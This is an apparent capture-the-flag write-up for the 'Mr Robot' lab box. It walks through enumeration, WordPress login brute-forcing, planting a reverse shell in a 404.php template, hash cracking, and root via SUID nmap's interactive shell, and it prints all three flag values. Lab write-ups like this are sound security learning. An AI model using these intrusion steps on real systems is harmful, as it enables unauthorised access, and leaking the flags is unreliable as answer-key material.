Mr Robot

Overview
This was one of the first CTFs where I actually felt like I was doing a full attack chain instead of just solving random tasks. It started with simple enumeration and ended with root access.

Overview of the Task



1.What is Key 1 ?


Initial Enumeration

Started with Nmap to identify open ports.
```
nmap -sC -sV <target-ip>
```
From the scan (as shown in the screenshot), I found multiple open ports including HTTP



Directory Enumeration

Used Gobuster to find hidden directories.
```
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt

```




robots.txt Discovery

Since /robots.txt returned status 200, I checked it:
```
curl http://<target-ip>/robots.txt
```
Found:
```
fsocity.dic
key-1-of-3.txt
```


Vallaaaa!!! , We found the first key-1-of-3.txt




First key 1 - 073403c8a58a1f80d943455fb30724b9



2.What is Key 2?


Downloading Wordlist

Downloaded:
```
curl -O http://<target-ip>/fsocity.dic
```
This turned out to be a very large wordlist


As we can see that it a long wordlist , lets see if we can find the username from this so that we can brute force the password and get login credentials.

Username Enumeration (Burp Suite)

Instead of guessing usernames:
- Captured login request in Burp 
- Sent it to Intruder 
- Used fsocity.dic as payload
- Observed response length differences 
📸 (Insert Burp request + Intruder screenshot)
👉 Found valid username:
```
Elliot
```





Finding Password
<target.ip>/license in this page if we inspect we will find the hashed text

If we decode it 

That's the Password right. Lets login <target_ipadress>/wp-login.php


Elliot is allowed to edit files!

Edited 404.php file in Templates .

Substituted its content by pentestmokey reverse shell, personalizing IP and Port. Hit Update File . Received message: File edited successfully .


Gaining Shell

Logged into WordPress and edited:
```
404.php
```
Inserted reverse shell.

Started listener:
```
nc -lvnp 4444
```
Triggered the file  by opening this url http://10.129.176.173/wp-includes/themes/TwentyFifteen/404.php  and got shell: 
```
whoami
```

```
daemon
```


Exploring the System

Checked /home:
```
ls /home
```
Found:
```
robot
```
Inside:
```
password.raw-md5
```





Hash Cracking

Extracted hash and cracked it:
```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```





Key 2

```
cat /home/robot/key-2-of-3.txt
```

```
822c73956184f694993bede3eb39f959
```
we finally found the key 2 -> 822c73956184f694993bede3eb39f959


Privilege Escalation

Checked SUID binaries:
```
find / -perm -4000 2>/dev/null
```
Found:
```
/usr/local/bin/nmap
```



Exploiting Nmap

```
nmap --interactive
```
Then:
```
!sh
```
Got root shell.



Key 3

```
cd /rootcat key-3-of-3.txt
```

```
04787ddef27c3dee1ee161b21670b4e4
```
found key 3 - 04787ddef27c3dee1ee161b21670b4e4


Real Learning 

- I stopped guessing and started enumerating 
- Learned how response differences reveal valid users 
- Understood why correct Hydra config matters 
- Saw how one small misconfiguration (SUID) leads to root
